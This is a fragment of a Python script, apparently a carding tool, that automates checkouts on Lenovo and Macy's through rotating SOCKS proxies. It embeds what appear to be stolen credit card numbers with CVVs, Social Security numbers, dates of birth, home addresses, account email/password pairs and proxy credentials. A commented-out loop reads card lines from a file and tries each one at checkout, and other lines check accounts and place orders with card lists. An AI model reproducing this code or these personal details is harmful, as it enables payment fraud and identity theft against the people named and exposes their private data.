    ordervr = Lenovo(mun_browser=mun_browser,driver=driver)
    
    # checkInfo = {'ccnumber': '4856200252400075', 'ccmonth': '01', 'ccyear': '26', 'ccv': '0258', 'id': 25058, 'created': '2022-11-29 10:02:01.986435+0700', 'modified': '2022-11-29 10:02:01.986451+0700', 'created_by': None, 'customer': None, 'modified_by': None, 'type': None, 'owner': None, 'note': None, 'first_name': 'Joey', 'last_name': 'Clements', 'address1': 'BOX 1862', 'address2': None, 'city': 'EUNICE', 'state': 'NM', 'zipcode': '88231', 'dob': 'Jun 29 1950 12:00AM', 'ssn': '456842024', 'status': 0, 'price': '0.00', 'used': 0}
    # checkInfo['checkout_url'] = 'https://payments.worldpay.com/app/hpp/integration/wpg/corporate?OrderKey=LENOVOAUDPM%5Epre_1072526720807587840&Ticket=001676183896983020KX_ssmmcN8cqykcSX35IA&source=https%3A%2F%2Fsecure.worldpay.com%2Fsc5'
    # checkInfo = ordervr.check(sock5='Bproxy2023-rotate:Hanoi2023@p.webshare.io:80', checkoutInfo=checkInfo)
    # print(checkInfo)

    link_checkout = ordervr.get_link_checkout(sock5='Bproxy2023-rotate:Hanoi2023@p.webshare.io:80', email='CeparsdanoMaziya@hotmail.com', password='sjvcvA7ej', infoCheckout={'id': 19921, 'created': '2022-11-29 10:02:01.384876+0700', 'modified': '2022-11-29 10:02:01.384895+0700', 'created_by': None, 'customer': None, 'modified_by': None, 'type': None, 'owner': None, 'note': None, 'first_name': 'Albert', 'last_name': 'Ulloa', 'address1': '6435', 'address2': None, 'city': 'Bell Gardens', 'state': 'CA', 'zipcode': '90201', 'dob': 'Nov  8 1968 12:00AM', 'ssn': '558711648', 'status': 0, 'price': '0.00', 'used': 0})
    print(link_checkout)
    
    # print(link_checkout)
    # logged = False
    # while 1:
    #     if not logged:
    #         try:
    #             link_checkout = ordervr.get_link_checkout(sock5='fwhjolqn-rotate:d3oxuwiomiii@p.webshare.io:80', email='CeparanoMaziya@hotmail.com', password='sjvcvA7ej')
    #         except Exception as e:
    #             pass
    #         else:
    #             logged = True
    #             print(link_checkout)
    #             # break
    #     if logged:
    #         try:
    #             link_checkout = ordervr.get_link_checkout(sock5='fwhjolqn-rotate:d3oxuwiomiii@p.webshare.io:80')
    #         except Exception as e:
    #             logged = False
    #         else:
    #             print('==requests==',link_checkout)

    # login_result = ordervr.login(email='CeparanoMaziya@hotmail.com', password='sjvcvA7ej')
    # f = open('test.txt','r', encoding='utf-8')
    # list_read = f.read()
    # while 1:
        # time.sleep(30)
        # ordervr.get_link_checkout(sock5='192.168.8.112:30000')

    # br.add_header('https://account.lenovo.com/us/en/account/wallet/create.html', extraHeader=headers)  
    # c = open('dien.html', 'w', encoding='utf8')
    # c.write(r.text)    
    
    # ordervr.check_out()
    # i=0
    # get_link = 0
    # for line in list_read.split('\n'):
    #     if line.strip():
    #         infoCC = parse_cc(line.strip())
    #         infoCC['first_name'] = 'Yingge'
    #         infoCC['last_name'] = 'Wang'
    #         if i == 0:
    #             try:
    #                 linkcheckout = ordervr.get_link_checkout(sock5='fwhjolqn-rotate:d3oxuwiomiii@p.webshare.io:80', refresh=True)
    #             except Exception as e:
    #                 i=0
    #                 continue
    #             get_link+1
    #         infoCC['checkout_url'] = linkcheckout
    #         try:
    #             checkout_result = ordervr.check_out(infoCC, sock5='fwhjolqn-rotate:d3oxuwiomiii@p.webshare.io:80')
    #             if checkout_result:
    #                 i = 0
    #                 continue
    #             else:
    #                 i+=1
    #         except Exception as e:
    #             i = 0 
    #             continue
    #         if i > 3:
    #             i=0
    print('===finished===')        
    # ordervr.check(checkInfo)
    # ordervr.get_info_account_infomation()
    # ordervr.change_email_info()='
    # check_status = ordervr.check_order_status('1250059297','stephanie_mun@gorge.net',sock='127.0.0.1:9951')
    # print(check_status
    # check = ordervr.check('LizaHickey@gmail.com','sahale',sock='127.0.0.1:9951',sock_type='socks')
    # print(check
    # card_id = ordervr.get_macys_card_info('208172905',get_all=True)
    # print(card_id
    # bskvarla@pacbell.net|Hanoi123
    #artglasscreations@sbcglobal.net|dakota|TravisL|buss|2374 Hardscrabble Rd||Drain|OR|97435|Macys4580|438283264580|1|1999
    # status = ordervr.order('','',list_card='4147099237311806|11|2020',
    #                        account_infomation='kittyvaidai|hanoi123',
    #                        sock='127.0.0.1:9951', flavors='', item_name='',
    #                        item_id_link='http://www1.macys.com/shop/product/chanel-coco-noir-eau-de-parfum-1.7-oz?ID=725964',
    #                        weight='')
    # print(status


if __name__ == "__main__":
    sys.exit(main())
